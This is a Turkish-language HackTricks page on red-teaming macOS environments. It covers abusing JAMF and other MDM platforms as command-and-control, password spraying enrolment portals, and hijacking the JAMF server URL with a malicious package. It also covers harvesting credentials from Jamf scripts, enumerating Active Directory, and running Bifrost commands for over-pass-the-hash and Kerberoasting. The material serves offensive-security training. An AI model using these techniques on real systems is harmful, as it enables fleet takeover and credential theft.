# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## MDM'leri Kötüye Kullanma

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Management platformuna erişmek için **admin kimlik bilgilerini ele geçirmeyi** başarırsanız, malware'ınızı makinelerde dağıtarak **potansiyel olarak tüm bilgisayarları ele geçirebilirsiniz**.

MacOS ortamlarında Red Teaming yapmak için MDM'lerin nasıl çalıştığı hakkında temel bir anlayışa sahip olmanız önemle tavsiye edilir:


{{#ref}}
macos-mdm/
{{#endref}}

### MDM'yi C2 Olarak Kullanma

Bir MDM; profilleri yükleme, sorgulama veya kaldırma, uygulamalar yükleme, yerel admin hesapları oluşturma, firmware parolası ayarlama, FileVault anahtarını değiştirme gibi izinlere sahip olacaktır...

Kendi MDM'inizi çalıştırmak için **CSR'nizin bir vendor tarafından imzalanması** gerekir; bunu [**https://mdmcert.download/**](https://mdmcert.download/) üzerinden edinmeyi deneyebilirsiniz. Apple cihazları için kendi MDM'inizi çalıştırmak amacıyla [**MicroMDM**](https://github.com/micromdm/micromdm) kullanabilirsiniz.

Ancak enrolled bir cihaza uygulama yüklemek için uygulamanın hâlâ bir developer hesabı tarafından imzalanmış olması gerekir... bununla birlikte, MDM enrolment işlemi sırasında **cihaz, MDM'in SSL cert'ini güvenilir bir CA olarak ekler**, dolayısıyla artık her şeyi imzalayabilirsiniz.<sup>[[4]](#references)</sup>

Cihazı bir MDM'e enrol etmek için root olarak bir **`mobileconfig`** dosyası yüklemeniz gerekir; bu dosya bir **pkg** dosyası aracılığıyla gönderilebilir (zip içinde sıkıştırabilirsiniz ve Safari'den indirildiğinde zip açılır).

**Mythic agent Orthrus** bu tekniği kullanır.

### JAMF PRO'yu Kötüye Kullanma

JAMF, **custom scripts** (sysadmin tarafından geliştirilen script'ler), **native payloads** (yerel hesap oluşturma, EFI parolası ayarlama, dosya/process monitoring...) ve **MDM** (cihaz yapılandırmaları, cihaz sertifikaları...) çalıştırabilir.<sup>[[5]](#references)</sup>

#### JAMF self-enrolment

**Self-enrolment özelliğinin etkin olup olmadığını** görmek için `https://<company-name>.jamfcloud.com/enroll/` gibi bir sayfaya gidin. Etkinse, **erişim için credentials isteyebilir**.

Password spraying attack gerçekleştirmek için [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) script'ini kullanabilirsiniz.

Ayrıca, uygun credentials'ı bulduktan sonra aşağıdaki form ile diğer username'leri brute-force edebilirsiniz:

![Abusing JAMF PRO - JAMF self-enrolment: Moreover, after finding proper credentials you could be able to brute-force other usernames with the next form](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** binary'si, keychain'i açmak için gereken secret'ı içeriyordu; keşfedildiği sırada bu secret **herkes arasında paylaşılıyordu** ve şu şekildeydi: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Ayrıca jamf, **`/Library/LaunchAgents/com.jamf.management.agent.plist`** konumunda bir **LaunchDaemon** olarak **persist** eder.

#### JAMF Device Takeover

**`jamf`** tarafından kullanılacak **JSS** (Jamf Software Server) **URL'si**, **`/Library/Preferences/com.jamfsoftware.jamf.plist`** konumunda bulunur.\
Bu dosya temel olarak URL'yi içerir:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Böylece bir saldırgan, yüklendiğinde **bu dosyanın üzerine yazan** ve **URL'yi bir Typhon agent'ından Mythic C2 listener'ına ayarlayan** zararlı bir paket (`pkg`) bırakabilir; bu sayede JAMF'i C2 olarak kötüye kullanabilir.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Bir cihaz ile JAMF arasındaki iletişimi **taklit edebilmek** için şunlara ihtiyacınız vardır:

- Cihazın **UUID** değeri: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Şu konumda bulunan **JAMF keychain**: `/Library/Application\ Support/Jamf/JAMF.keychain`; bu dosya cihaz sertifikasını içerir

Bu bilgilerle, **çalınmış** Hardware **UUID** değerine sahip ve **SIP devre dışı** bırakılmış bir **VM oluşturun**, **JAMF keychain** dosyasını kopyalayın, Jamf **agent**'ını **hook** edin ve bilgilerini çalın.

#### Secret stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Ayrıca `/Library/Application Support/Jamf/tmp/` konumunu, yöneticilerin Jamf üzerinden çalıştırmak isteyebileceği **özel script**'ler için izleyebilirsiniz; bu script'ler **buraya yerleştirilir, çalıştırılır ve silinir**. Bu script'ler **credential** içerebilir.

Ancak **credential**'lar bu script'lere **parametre** olarak da aktarılabilir. Bu nedenle `ps aux | grep -i jamf` komutunu (root olmadan bile) izlemeniz gerekir.

[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) script'i, eklenen yeni dosyaları ve yeni process argümanlarını dinleyebilir.

### macOS Remote Access

Ayrıca **MacOS**'un "özel" **network** **protocol**'leri hakkında:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Bazı durumlarda **MacOS bilgisayarının bir AD'ye bağlı** olduğunu göreceksiniz. Bu senaryoda, alışık olduğunuz şekilde active directory'yi **enumerate** etmeyi denemelisiniz. Aşağıdaki sayfalarda bazı **yardım** kaynakları bulabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Size yardımcı olabilecek bazı **yerel MacOS tool**'ları arasında `dscl` de bulunur:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Ayrıca MacOS için AD'yi otomatik olarak enumerate etmek ve kerberos ile çalışmak üzere hazırlanmış bazı araçlar da bulunmaktadır:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound, MacOS hosts üzerindeki Active Directory ilişkilerini toplamaya ve içe aktarmaya olanak tanıyan Bloodhound audting tool için bir extension'dır.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost, macOS üzerindeki Heimdal krb5 API'leriyle etkileşim kurmak için tasarlanmış bir Objective-C projesidir. Projenin amacı, hedefte başka bir framework veya package gerektirmeden native API'leri kullanarak macOS cihazlarında Kerberos çevresinde daha iyi security testing yapılmasını sağlamaktır.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory enumeration yapmak için kullanılan JavaScript for Automation (JXA) tool'udur.

### Domain Bilgileri
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Users

Üç tür MacOS kullanıcısı vardır:

- **Local Users** — Yerel OpenDirectory service tarafından yönetilirler; Active Directory ile herhangi bir şekilde bağlantılı değillerdir.
- **Network Users** — Kimlik doğrulamak için DC server'a bağlantı gerektiren geçici Active Directory kullanıcılarıdır.
- **Mobile Users** — Kimlik bilgileri ve dosyaları için yerel bir yedeğe sahip Active Directory kullanıcılarıdır.

Users ve groups hakkındaki yerel bilgiler _/var/db/dslocal/nodes/Default._ klasöründe saklanır.\
Örneğin, _mark_ adlı user hakkındaki bilgiler _/var/db/dslocal/nodes/Default/users/mark.plist_ dosyasında, _admin_ group hakkındaki bilgiler ise _/var/db/dslocal/nodes/Default/groups/admin.plist_ dosyasında saklanır.

HasSession ve AdminTo edges kullanılmasına ek olarak, **MacHound Bloodhound database'ine üç yeni edge ekler**:<sup>[[2]](#references)</sup>

- **CanSSH** - host'a SSH yapmasına izin verilen entity
- **CanVNC** - host'a VNC yapmasına izin verilen entity
- **CanAE** - host üzerinde AppleEvent scripts execute etmesine izin verilen entity
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Daha fazla bilgi için [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Computer$ password

Şunları kullanarak passwords alın:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** parolasına System keychain içinde erişmek mümkündür.

### Over-Pass-The-Hash

Belirli bir kullanıcı ve servis için bir TGT alın:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGT elde edildikten sonra, şu şekilde mevcut session'a inject edilebilir:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Elde edilen service ticket'larla diğer bilgisayarlardaki paylaşımlara erişmeyi denemek mümkündür:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Keychain'e Erişim

Keychain, bir prompt oluşturmadan erişilmesi durumunda bir red team çalışmasının ilerletilmesine yardımcı olabilecek hassas bilgiler içeriyor olabilir:


{{#ref}}
macos-keychain.md
{{#endref}}

## Harici Servisler

macOS Red Teaming, genellikle **macOS'un çeşitli harici platformlarla doğrudan entegre olması** nedeniyle düzenli bir Windows Red Teaming çalışmasından farklıdır. Yaygın bir macOS yapılandırmasında bilgisayara **OneLogin ile senkronize edilmiş kimlik bilgileri kullanılarak erişilir ve OneLogin üzerinden çeşitli harici servislere** (github, aws gibi) erişim sağlanır.

## Çeşitli Red Team teknikleri

### Safari

Safari'de bir dosya indirildiğinde, dosya "güvenli" bir dosyaysa **otomatik olarak açılır**. Örneğin, **bir zip indirirseniz**, zip otomatik olarak açılır:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Referanslar

- [1] [Gone Apple Pickin': Red Teaming MacOS Environments in 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Introducing MacHound: A Solution to macOS Active Directory Based Attacks](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: Turning macOS Management Evil](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Active Directory Discovery with a Mac - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)


{{#include ../../banners/hacktricks-training.md}}
